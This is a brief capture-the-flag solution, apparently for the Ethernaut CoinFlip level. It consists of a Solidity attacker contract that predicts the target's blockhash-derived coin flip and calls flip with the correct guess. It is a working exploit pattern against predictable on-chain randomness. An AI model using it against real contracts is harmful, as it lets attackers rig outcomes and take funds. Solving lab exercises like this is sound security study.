the flip value can be anticipated by running a contract that executes the same code as the `flip` method

```
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {
    function flip(bool) public returns (bool) {}
}

contract TrickCoinFlip {
    using SafeMath for uint256;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip instance;

    constructor() {
        instance = CoinFlip(<contract address>);
    }

    function trick() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return instance.flip(side);
    }
}
```
